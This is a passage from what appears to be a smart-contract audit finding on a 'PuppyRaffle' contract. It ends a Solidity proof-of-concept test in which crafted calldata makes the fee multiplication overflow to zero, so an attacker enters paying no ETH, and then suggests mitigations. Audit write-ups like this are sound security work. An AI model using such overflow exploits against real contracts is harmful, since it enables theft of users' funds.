            mstore(add(payload, 0x24), maliciousLength)
        }

        // Attacker sends 0 ETH, because highEntranceFee * maliciousLength overflows to 0
        (bool success, ) = address(puppyRaffle).call{value: 0}(payload);
        require(success, "Call should not revert due to overflow");
        
        // The check passes, but we can't assert players.length because the transaction would run out of gas.
        // The vulnerability is in the flawed `require` statement.
    }
}
```

## Suggested Mitigation
Prefer compiling with Solidity ≥0.8.0 (built-in overflow checks) or wrap the two multiplications involving `entranceFee` (in `enterRaffle` and `selectWinner`) with OpenZeppelin’s SafeMath to guard against theoretical overflows.



